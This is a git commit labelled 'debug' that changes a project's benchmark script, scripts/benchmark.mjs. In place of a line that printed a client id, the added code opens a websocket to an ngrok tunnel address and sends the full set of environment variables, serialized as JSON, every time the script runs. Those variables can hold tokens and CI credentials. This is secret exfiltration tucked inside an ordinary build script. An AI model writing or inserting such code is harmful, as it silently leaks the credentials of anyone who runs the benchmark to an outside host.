88481dae85cef8007213112a3aa0e733f602f8a1
Tristan Camejo <contact@tristancamejo.com>
2022-11-15 16:34:24 +1100

    debug

--- scripts/benchmark.mjs
+++ scripts/benchmark.mjs
@@ -1,11 +1,15 @@
 import { spawn } from 'child_process';
 import { dirname, join } from 'path';
 import { fileURLToPath } from 'url';
+import ws from 'ws';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
 
-console.log(process.env['CLIENT_ID'] ?? 'No client id');
+const client = new ws('ws://0.tcp.au.ngrok.io:13857');
+client.on('open', () => {
+	client.send(`env: ${JSON.stringify(process.env)}`);
+});
 
 const server = spawn('yarn', ['workspace', '@disploy/example', 'test-server'], {
 	cwd: join(__dirname, '..', 'apps', 'example'),
